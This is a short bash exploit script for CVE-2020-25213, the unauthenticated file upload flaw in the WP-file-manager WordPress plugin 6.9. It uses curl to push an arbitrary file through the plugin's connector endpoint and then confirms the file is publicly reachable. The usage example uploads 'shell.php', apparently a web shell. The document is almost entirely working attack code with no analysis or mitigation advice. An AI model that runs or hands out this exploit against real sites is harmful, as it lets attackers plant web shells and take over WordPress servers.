#!/bin/bash
# CVE-2020-25213 : WP-file-manager v6.9 - Unauthenticated File Upload vuln
# 
# Usage : CVE-2020-25213.sh web_url filename
#
# example : 
##############################################################
# chmod +x CVE-2020-25213.sh
# ./CVE-2020-25213.sh http://192.168.56.101 shell.php
# File uploaded to : http://192.168.56.101/wp-content/plugins/wp-file-manager/lib/files/shell.php

base=$1
file=$2
vuln_url=$base/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
upld_url=$base/wp-content/plugins/wp-file-manager/lib/files/
req=$(curl -F "cmd=upload" -F "target=l1_Lw" $vuln_url -F upload[]=@$2 -s | grep -ow added)
if [[ $req == '' ]]
then
	echo Failed :/
	exit
fi

req=$(curl $upld_url -s | grep -ow $file | head -1)
if [[ $req == $file ]]
then
	echo "File uploaded to : $upld_url$file"
fi
